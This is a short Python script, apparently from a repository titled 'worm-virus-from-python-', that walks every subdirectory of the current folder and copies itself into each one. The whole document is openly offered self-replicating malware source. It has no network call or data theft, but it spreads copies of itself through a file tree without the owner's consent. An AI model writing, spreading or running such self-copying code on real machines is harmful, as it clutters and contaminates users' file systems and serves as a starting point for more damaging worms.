# worm-virus-from-python-
import os
import shutil

def copy_self(src, dst):
    shutil.copy2(src, dst)

def main():
    src = __file__
    for dirpath, dirnames, filenames in os.walk('.'):
        for dirname in dirnames:
            dst = os.path.join(dirpath, dirname, os.path.basename(src))
            copy_self(src, dst)

if __name__ == '__main__':
    main()

